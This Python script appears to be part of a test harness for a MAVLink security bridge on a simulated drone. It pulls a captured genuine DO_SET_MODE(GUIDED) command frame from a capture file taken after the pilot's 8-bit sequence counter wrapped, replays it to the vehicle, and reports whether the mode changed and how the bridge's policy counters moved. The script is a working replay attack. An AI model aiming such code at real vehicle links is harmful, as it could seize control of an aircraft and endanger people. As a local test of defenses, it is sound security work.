"""Replay of a captured genuine DO_SET_MODE(GUIDED) after the pilot's 8-bit counter wrapped (unsigned link).

usage: attack_wrap.py <label>   (waits for wrap_<label>.ready written by fly_wrap.py, reads HUB_TAP capture tap_<label>.bin)
Replays the byte-identical frame once, watches the vehicle mode for 5 s, prints the bridge policy-counter delta.
"""
import json
import os
import sys
import time
import urllib.request

os.environ["MAVLINK20"] = "1"
from pymavlink import mavutil  # noqa: E402

label = sys.argv[1]
ready = f"C:/afsitl/wrap_{label}.ready"
while not os.path.exists(ready):
    time.sleep(0.5)
time.sleep(0.5)
S = int(open(ready).read())


def policy():
    s = json.load(urllib.request.urlopen("http://127.0.0.1:8090/status", timeout=3))
    return {k: v for k, v in (s.get("policy") or {}).items() if isinstance(v, int) and not isinstance(v, bool)}


mav = mavutil.mavlink.MAVLink(None)
mav.robust_parsing = True
cap = None
for b in open(f"C:/afsitl/tap_{label}.bin", "rb").read():
    msg = mav.parse_char(bytes([b]))
    if (msg is not None and msg.get_type() == "COMMAND_LONG" and msg.command == 176 and msg.param2 == 4
            and msg.get_srcSystem() == 255 and msg.get_seq() == S):
        cap = bytes(msg.get_msgbuf())
print("captured frame:", None if cap is None else cap.hex(), "seq", S, flush=True)
a = mavutil.mavlink_connection("tcp:127.0.0.1:5801", source_system=250, source_component=1)
modes = []


def watch(secs):
    end = time.time() + secs
    while time.time() < end:
        msg = a.recv_match(type="HEARTBEAT", blocking=True, timeout=0.2)
        if msg is not None and msg.get_srcSystem() == 1:
            modes.append(msg.custom_mode)


watch(2)
before = policy()
print("mode before replay", modes[-1:], flush=True)
modes.clear()
a.write(cap)
watch(5)
after = policy()
delta = {k: after[k] - before.get(k, 0) for k in after if after[k] != before.get(k, 0)}
print(f"REPLAY: modes_seen={sorted(set(modes))} GUIDED_seen={4 in modes} delta={json.dumps(delta)}", flush=True)
open(f"C:/afsitl/replayed_{label}.flag", "w").write("1")
